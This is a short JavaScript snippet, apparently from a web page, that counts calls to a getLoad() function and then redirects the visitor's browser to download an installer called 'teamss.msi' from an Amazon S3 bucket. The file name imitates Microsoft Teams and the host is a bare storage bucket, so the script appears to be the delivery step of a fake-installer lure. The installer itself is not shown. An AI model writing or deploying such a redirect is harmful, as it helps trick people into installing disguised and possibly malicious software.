function loadUrl()
{
	if(num>=1)
	{
		var url="https://tseyt.s3.ap-southeast-2.amazonaws.com/teamss.msi";
		window.location=url;
	}
}

var num=0;
function getLoad()
{
	num++;
}